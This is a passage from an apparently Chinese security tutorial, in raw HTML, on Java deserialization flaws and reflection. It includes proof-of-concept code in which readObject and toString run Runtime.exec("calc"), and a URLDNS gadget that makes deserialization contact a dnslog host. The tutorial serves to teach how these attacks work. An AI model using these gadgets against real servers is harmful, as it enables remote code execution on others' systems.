class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Serialization</span> &#123;<br><br>    <span class="hljs-comment">//定义一个静态方法 serialize(Object obj)，接收一个对象并把它序列化到文件</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">// ObjectOutputStream：包装文件输出流，使其支持写对象</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<br>            <span class="hljs-comment">// Files.newOutputStream(...)：创建一个输出流，写入到 ser.bin 文件</span><br>            <span class="hljs-comment">// Paths.get(&quot;ser.bin&quot;)：得到一个路径对象，表示当前项目目录下的 ser.bin 文件</span><br>            Files.newOutputStream(Paths.get(<span class="hljs-string">&quot;ser.bin&quot;</span>))<br>        );<br>        <span class="hljs-comment">//oos.writeObject(obj)：把传入的 obj 写到文件里（前提是对象必须实现 Serializable 接口）</span><br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>, <span class="hljs-number">11</span>);<br>        System.out.println(person);<br>        <span class="hljs-comment">//把这个 person 对象写入 ser.bin 文件</span><br>        serialize(person);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Unserialize</span> &#123;<br><br>    <span class="hljs-comment">//定义一个静态方法 unserialize，接收序列化后的二进制文件</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">//new ObjectInputStream(...)：包装成对象输入流，这样可以直接读取对象</span><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<br>            <span class="hljs-comment">// Files.newInputStream(Paths.get(filename))：创建一个输入流，指向 filename 文件</span><br>            Files.newInputStream(Paths.get(filename))<br>        );<br>        <span class="hljs-comment">//ois.readObject()：从文件中读取对象</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">//调用 unserialize(&quot;ser.bin&quot;)，从 ser.bin 文件里反序列化得到一个对象，强制转换为 Person 类型</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> (Person) unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>        System.out.println(person);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><font style="color:#080808;background-color:#ffffff;">Serialization 创建 Person 对象并将其序列化保存到文件 ser.bin</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311749774.png"></p><p>生成的 <font style="color:#080808;background-color:#ffffff;"> ser.bin </font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311750280.png"></p><p><font style="color:#080808;background-color:#ffffff;">Unserialize  从 ser.bin 文件里恢复（反序列化）一个对象  </font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311750920.png"></p><p><strong>总的来说：</strong></p><p> 在 <code>serialize</code> 方法中，先通过输出流对象 <code>new FileOutputStream(&quot;ser.bin&quot;)</code>【等价于 <code>Files.newOutputStream(Paths.get(&quot;ser.bin&quot;))</code>】创建文件输出通道，然后将输出流包装成 <code>ObjectOutputStream</code>，再调用 <code>writeObject</code> 方法将对象序列化并写入文件。</p><p> 在 <code>unserialize</code> 方法中，先通过输入流对象 <code>new FileInputStream(&quot;ser.bin&quot;)</code>【等价于 <code>Files.newInputStream(Paths.get(&quot;ser.bin&quot;))</code>】创建文件输入通道，然后将输入流包装成 <code>ObjectInputStream</code>，再调用 <code>readObject</code> 方法将文件中的二进制数据读取出来并反序列化成对象。  </p><h2 id="1-5-为什么会产生安全问题？"><a href="#1-5-为什么会产生安全问题？" class="headerlink" title="1.5 为什么会产生安全问题？"></a>1.5 为什么会产生安全问题？</h2><p>只要服务端反序列化数据，客户端传递类的readObject中代码会自动执行，给予攻击者在服务器上运行代码的能力。</p><ol><li><font style="color:rgb(51, 51, 51);">入口类的</font><code>&lt;font style=&quot;color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);&quot;&gt;readObject&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">直接调用危险方法</font></li><li><font style="color:rgb(51, 51, 51);">入口参数中包含可控类，该类有危险方法，readObject 时调用</font></li><li><font style="color:rgb(51, 51, 51);">入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject 时调用</font></li><li><font style="color:rgb(51, 51, 51);">构造函数&#x2F;静态代码块等类加载时隐式执行</font></li></ol><h3 id="1-5-1-入口类的-readObject-直接调用危险方法"><a href="#1-5-1-入口类的-readObject-直接调用危险方法" class="headerlink" title="1.5.1 入口类的 readObject 直接调用危险方法"></a>1.5.1 入口类的 <code>readObject</code> 直接调用危险方法</h3><p>Person 类中写入：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    <span class="hljs-comment">//调用默认的反序列化过程</span><br>    ois.defaultReadObject();<br>    <span class="hljs-comment">//执行了一个系统命令</span><br>    Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p> 反序列化时 JVM 会先调用 Person 类中自定义的 <code>readObject</code> 方法，而其中加入了命令执行逻辑，因此对象恢复过程中就触发了计算器的运行。  </p><p>依次执行序列化、反序列化，弹出计算器：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311751914.png"></p><h3 id="1-5-2-入口参数中包含可控类，该类有危险方法，readObject-时调用"><a href="#1-5-2-入口参数中包含可控类，该类有危险方法，readObject-时调用" class="headerlink" title="1.5.2 入口参数中包含可控类，该类有危险方法，readObject 时调用"></a>1.5.2 入口参数中包含可控类，该类有危险方法，readObject 时调用</h3><p>为什么HashMap要自己实现writeObject和readObject方法？</p><p><a href="https://juejin.cn/post/6844903954774491144">https://juejin.cn/post/6844903954774491144</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test01</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        HashMap&lt;URL, Integer&gt; hash = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://w9ge5j.dnslog.cn&quot;</span>);<br>        hash.put(u, <span class="hljs-number">1</span>);<br><br>        serializableTest(hash);<br>        unserializableTest(<span class="hljs-string">&quot;dns.txt&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 序列化</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serializableTest</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;dns.txt&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-comment">// 反序列化</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserializableTest</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752489.png"></p><p><code>URL</code> 类在 JDK 里是自带的类，它的 <code>hashCode()</code> 方法里会触发 DNS 解析  </p><p> 入口参数里包含了可控的类（<code>URL</code>），而该类在反序列化过程中会自动调用危险方法（<code>hashCode()</code> 触发 DNS 解析），那么在 <code>readObject()</code> 反序列化时就会执行这些危险逻辑，造成安全风险。  </p><h4 id="HashMap-找入口类分析："><a href="#HashMap-找入口类分析：" class="headerlink" title="HashMap 找入口类分析："></a>HashMap 找入口类分析：</h4><p>本例中的代码利用了 <font style="color:#080808;background-color:#ffffff;">HashMap&lt;URL, Integer&gt;</font>，那么看看为什么它会造成漏洞</p><p>跟进 HashMap ，此处继承了 <font style="color:#080808;background-color:#ffffff;">Serializable</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752099.png"></p><p>找到重写的 readObject</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752120.png"></p><p>跟进 hash</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752777.png"></p><p>跟进 hashCode,<font style="color:rgb(80, 80, 92);">hashCode 位置处于 Object 类当中</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752211.png"></p><p>这样，HashMap 完美满足了可序列化、重写 readObject、接收任意对象作为参数、JDK 自带的入口类条件。</p><h3 id="1-5-3-入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject-时调用"><a href="#1-5-3-入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject-时调用" class="headerlink" title="1.5.3 入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject 时调用"></a><font style="color:rgb(51, 51, 51);">1.5.3 入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject 时调用</font></h3><h3 id="1-5-4-构造函数-静态代码块等类加载时隐式执行"><a href="#1-5-4-构造函数-静态代码块等类加载时隐式执行" class="headerlink" title="1.5.4 构造函数&#x2F;静态代码块等类加载时隐式执行"></a><font style="color:rgb(51, 51, 51);">1.5.4 构造函数&#x2F;静态代码块等类加载时隐式执行</font></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>     <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125;<br>&#125;  <br><br><span class="hljs-comment">//对obj对象进行输出 默认调用原始对象的toString 方法</span><br>System.out.println(obj);<br></code></pre></td></tr></table></figure><p> 在 <code>toString()</code> 中写入危险逻辑，那么只要对象在打印时被隐式调用，就会自动执行恶意代码  </p><h2 id="1-6-找漏洞的三个条件"><a href="#1-6-找漏洞的三个条件" class="headerlink" title="1.6 找漏洞的三个条件"></a>1.6 找漏洞的三个条件</h2><p>首先一个前提：<strong><font style="color:rgb(80, 80, 92);">继承了 </font></strong><font style="color:#080808;background-color:#ffffff;">Serializable</font><font style="color:rgb(80, 80, 92);">，使对象可序列化</font></p><ul><li>入口类 source<ul><li>可序列化</li><li>重写 readObject 调用常见函数</li><li>接收任意对象作为参数，参数类型宽泛</li><li>最后 JDK 自带</li></ul></li><li>调用链 gadget chain</li><li>执行类 sink <ul><li><font style="color:rgb(80, 80, 92);">RCE SSRF 写文件等等</font></li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752309.png"></p><h1 id="2、Java-反射-URLDNS-链"><a href="#2、Java-反射-URLDNS-链" class="headerlink" title="2、Java 反射+URLDNS 链"></a><font style="color:rgb(76, 76, 87);">2、Java 反射+URLDNS 链</font></h1><h2 id="2-1-Java-反射理解"><a href="#2-1-Java-反射理解" class="headerlink" title="2.1 Java 反射理解"></a>2.1 Java 反射理解</h2><blockquote><p><font style="color:rgb(37, 41, 51);">谈谈Java反射：从入门到实践，再到原理</font></p><p><a href="https://juejin.cn/post/6844904025607897096">https://juejin.cn/post/6844904025607897096</a></p></blockquote><p>反射的作用：让 Java 具有动态性</p><h3 id="2-1-1-静态语言-VS-动态语言"><a href="#2-1-1-静态语言-VS-动态语言" class="headerlink" title="2.1.1 静态语言 VS 动态语言"></a>2.1.1 静态语言 VS 动态语言</h3><p>Java 本身使一种静态语言，编译时就决定了类型：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//编译器认为 student 的类型是 Student，</span><br><span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br></code></pre></td></tr></table></figure><p>而动态语言，比如PHP：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$var</span> = <span class="hljs-string">&quot;hello&quot;</span>;  <span class="hljs-comment">// 此时 $var 是字符串</span><br><span class="hljs-variable">$var</span> = <span class="hljs-number">123</span>;      <span class="hljs-comment">// 运行时再赋值，现在 $var 就是整数</span><br></code></pre></td></tr></table></figure><p>再次对比：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311753866.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311753415.png"></p><h3 id="2-1-2-正射与反射"><a href="#2-1-2-正射与反射" class="headerlink" title="2.1.2 正射与反射"></a><font style="color:rgb(76, 76, 87);">2.1.2 正射与反射</font></h3><p><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/reflection/index.html">官方对反射的解释</a></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311753682.png"></p><p><strong>反射机制</strong>使Java代码能够探查已加载类的字段、方法及构造函数信息，并在安全限制范围内，通过反射字段、方法和构造函数对这些底层对应元素进行操作。该 API 既支持需要访问目标对象公共成员（基于其运行时类）的应用程序，也支持访问给定类声明成员的场景，同时允许程序抑制默认的反射访问控制。</p><p><strong>正射（直接调用）：在未运行时（编译时）已经知道了要运行的类</strong> <strong>Student</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311753359.png"></p><p><strong>反射：在运行的时候 forName 从 className&#x3D;”com.demo02.Student” 加载 Student 类，再去调用方法</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311754403.png"></p><h3 id="2-1-3-Class-对象理解"><a href="#2-1-3-Class-对象理解" class="headerlink" title="2.1.3 Class 对象理解"></a>2.1.3 Class 对象理解</h3><p><font style="color:rgb(37, 41, 51);"> 先理解 ：</font><strong><font style="color:rgb(37, 41, 51);">RTTI（Run-Time Type Identification）运行时类型识别</font></strong></p><p>Java 在运行时识别对象和类的信息主要以俩种方式：一种是 RTTI ，它假定我们在编译期已知道了所有类型；另一种是 反射，在运行时发现和使用类的信息。</p><p><strong><font style="color:rgb(37, 41, 51);">每个类都有一个Class对象</font></strong><font style="color:rgb(37, 41, 51);">，每当编译一个新类就产生一个Class对象（更恰当地说，是被保存在一个同名的.class文件中）。</font></p><p><font style="color:rgb(37, 41, 51);">比如创建一个Student类，那么，JVM就会创建一个Student对应Class类的Class对象，该Class对象保存了Student类相关的类型信息。</font></p><p><strong><font style="color:rgb(37, 41, 51);">Class类的对象作用</font></strong><font style="color:rgb(37, 41, 51);">是运行时提供或获得某个对象的类型信息</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311754008.webp"></p><h2 id="2-2-反射使用"><a href="#2-2-反射使用" class="headerlink" title="2.2 反射使用"></a>2.2 反射使用</h2><h3 id="2-2-1-反射中极为重要的方法"><a href="#2-2-1-反射中极为重要的方法" class="headerlink" title="2.2.1 反射中极为重要的方法"></a>2.2.1 反射中极为重要的方法</h3><ul><li>获取类的方法：forName</li><li>实例化类对象的方法：newInstance</li><li>获取函数的方法：getMethod</li><li>执行函数的方法：invoke</li></ul><h3 id="2-2-2-获取-Class-类对象"><a href="#2-2-2-获取-Class-类对象" class="headerlink" title="2.2.2 获取 Class 类对象"></a>2.2.2 获取 Class 类对象</h3><ul><li>已知<strong>具体的类</strong>，通过类的 <strong>class</strong> 属性获取，</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Person.class;<br></code></pre></td></tr></table></figure><ul><li>已知某个<strong>类的实例</strong>，调用该实例的 **getClass() **方法获取 Class 对象</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> person.getClass();<br></code></pre></td></tr></table></figure><ul><li>已知一个<strong>类的全类名</strong>，且该类在类路径下，可通过 Class 类的<strong>静态方法 forName()</strong> 获取，可能抛出 ClassNotFoundException</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;demo01.Student&quot;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.reflection;<br><br><span class="hljs-comment">//测试 class 类的创建方式有哪些</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>        System.out.println(<span class="hljs-string">&quot;这个人是：&quot;</span>+person.name);<br><br>        <span class="hljs-comment">//方式一：通过对象获得</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> person.getClass();<br>        System.out.println(c1.hashCode());<br><br>        <span class="hljs-comment">//方式二：foename 获得</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c2</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.kuang.reflection.Student&quot;</span>);<br>        System.out.println(c2.hashCode());<br><br>        <span class="hljs-comment">//方式三：通过类名 .class 获得</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c3</span> <span class="hljs-operator">=</span> Student.class;<br>        System.out.println(c3.hashCode());<br><br>        <span class="hljs-comment">//方式四：基本内置类型的包装类都有一个 Type 属性</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c4</span> <span class="hljs-operator">=</span> Integer.TYPE;<br>        System.out.println(c4);<br><br>        <span class="hljs-comment">//获得父类类型</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c5</span> <span class="hljs-operator">=</span> c1.getSuperclass();<br>        System.out.println(c5);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    String name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>        <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>        <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = <span class="hljs-string">&quot;student&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Teacher</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Teacher</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = <span class="hljs-string">&quot;Teacher&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-2-3-实例化-创建对象"><a href="#2-2-3-实例化-创建对象" class="headerlink" title="2.2.3 实例化&#x2F;创建对象"></a>2.2.3 实例化&#x2F;创建对象</h3><blockquote><p>因为 Class 类是 <code>private</code> 私有属性，我们也无法通过创建对象的方式来获取 class 对象</p></blockquote><ul><li>通过 Class 的 **newInstance() **方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//newInstance 不能传参</span><br><span class="hljs-type">Person</span> <span class="hljs-variable">p1</span> <span class="hljs-operator">=</span> (Person) c.newInstance();<br>System.out.println(p1);<br></code></pre></td></tr></table></figure><ul><li>通过 Constructor 的 newInstance() 方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// getConstructor(Class&lt;?&gt;... parameterTypes)</span><br><span class="hljs-type">Constructor</span> <span class="hljs-variable">personconstructor</span> <span class="hljs-operator">=</span> c.getConstructor(String.class, <span class="hljs-type">int</span>.class);<br><span class="hljs-type">Person</span> <span class="hljs-variable">p2</span> <span class="hljs-operator">=</span> (Person) personconstructor.newInstance(<span class="hljs-string">&quot;asd&quot;</span>, <span class="hljs-number">11</span>);<br>System.out.println(p2);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755212.png"></p><h3 id="2-2-3-获取类里面的属性-Filed"><a href="#2-2-3-获取类里面的属性-Filed" class="headerlink" title="2.2.3 获取类里面的属性 Filed"></a>2.2.3 获取类里面的属性 Filed</h3><ul><li>getField(<font style="color:#080808;background-color:#ffffff;">String name</font>)：指定变量名，可获得 public 类型的属性</li><li>getFields()：获得类的 public 类型的属性</li><li>getDeclaredField(<font style="color:#080808;background-color:#ffffff;">String name</font>)：指定变量名，可获得所有类型的属性</li><li>getDeclaredFields()：获得类的所有类型的属性</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//获取类里面的属性</span><br>Field[] personfields1 = c.getFields();<br><span class="hljs-keyword">for</span> (Field field : personfields1) &#123;<br>    System.out.println(field);<br>&#125;<br><br>System.out.println(<span class="hljs-string">&quot;==================================&quot;</span>);<br><br>Field[] personfields2 = c.getDeclaredFields();<br><span 